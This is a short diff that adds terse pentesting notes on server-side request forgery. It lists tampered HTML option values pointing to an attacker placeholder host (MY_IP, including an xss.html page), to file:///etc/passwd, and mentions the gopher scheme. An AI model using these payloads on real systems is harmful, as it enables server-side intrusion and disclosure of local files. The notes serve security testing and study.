@@ -1,0 +1,9 @@
+##### SSRF
+Server side request forgery
+
+
+
+<option value="http://MY_IP"> if so <option value="http://MY_IP/xss.html">
+ 
+<option value="file:///etc/passwd">  gopher
+
